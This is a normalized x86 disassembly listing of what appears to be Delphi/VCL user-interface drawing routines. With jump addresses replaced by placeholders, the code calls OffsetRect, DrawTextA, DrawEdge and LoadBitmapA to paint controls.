cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4244a4
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042f8
push eax
mov eax [ ebp - 0xc ]
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4244a4
mov eax 0xff00000d
call sub_423fe4
mov esi eax
mov eax 0xff000010
call sub_423fe4
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4244a4
jmp r-xdata
sub_45d9a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45e28c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4250a4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424c70
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4244a4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404444
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424c70
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4250a4
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45a540
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425570
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424c70
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45ddeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42aa80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4244a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45a540
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424c70
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4250a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42bc8c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424c44
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4250a4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4250a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425274
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45aa58
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45d754
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_424770
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425570
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424ff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4244a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4032a8
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425570
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45d754
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e293
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45c818
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45d754
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45e2ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45ebb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4250a4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424c70
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4244a4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404444
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424c70
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4250a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45a540
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425570
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424c68
